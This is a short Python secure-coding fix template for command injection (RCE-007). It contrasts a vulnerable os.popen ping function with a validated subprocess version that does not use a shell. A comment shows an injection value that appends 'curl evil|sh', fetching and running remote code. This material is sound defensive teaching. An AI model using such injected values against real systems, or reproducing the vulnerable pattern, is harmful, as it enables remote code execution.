# Fix Template: RCE-007 — os.system / os.popen with a non-literal command
# AI SAFE2 v3.1 CP.5.MCP-1 (Command Construction Safety)
#
# ── BEFORE (vulnerable) ───────────────────────────────────────────
import os
def ping(host: str) -> str:
    return os.popen(f"ping -c1 {host}").read()   # host="x; curl evil|sh"
#
# ── AFTER (safe) ──────────────────────────────────────────────────
import ipaddress
import subprocess

def ping(host: str) -> str:
    ipaddress.ip_address(host)                   # validate: raises on non-IP input
    result = subprocess.run(
        ["/bin/ping", "-c1", host],              # argument list, no shell
        capture_output=True, text=True, timeout=10, shell=False, check=False,
    )
    return result.stdout
